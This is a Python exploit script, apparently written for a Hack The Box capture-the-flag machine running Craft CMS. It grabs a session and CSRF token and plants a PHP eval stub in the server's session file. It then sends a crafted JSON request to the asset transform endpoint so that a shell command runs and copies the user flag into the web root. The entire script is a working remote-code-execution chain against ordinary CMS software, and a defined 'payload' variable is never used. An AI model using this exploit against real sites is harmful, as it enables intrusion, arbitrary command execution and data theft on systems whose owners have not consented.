#!/usr/bin/env python3
import http.client, re, urllib.parse, json, time, random

host = '10.129.54.140'
port = 80

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie:
        h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

# Get session
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = m.group(1) if m else None
sc = r.getheader('Set-Cookie')
session = re.search(r'CraftSessionId=([^;]+)', sc).group(1) if sc else None
c.close()
print('Session:', session)

# Inject stub
path = '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>")
http_get(path, 'CraftSessionId=' + session)
time.sleep(1)

# Get fresh CSRF
status, body, _ = http_get('/index.php?p=admin/login', 'CraftSessionId=' + session)
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = m.group(1) if m else None
print('CSRF:', csrf[:20] + '...' if csrf else 'NONE')

# Exploit - write user.txt
body_obj = {'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}
body_json = json.dumps(body_obj)
payload = 'cat /home/adam/user.txt > /var/www/html/craft/web/flag.txt'
h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(body_json))}
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
c.request('POST', '/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('cat /home/adam/user.txt > /var/www/html/craft/web/flag.txt'), body=body_json.encode(), headers=h)
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
print('Write status:', r.status)
c.close()

# Fetch flag file
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/flag.txt', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
c.close()
print('Flag file status:', r.status)
if 'HTB{' in body:
    m = re.search(r'HTB\{[^}]+\}', body)
    if m:
        print('[+] USER FLAG:', m.group(0))
    else:
        print('No flag in body:', body[:500])
else:
    print('No flag in response:', body[:500])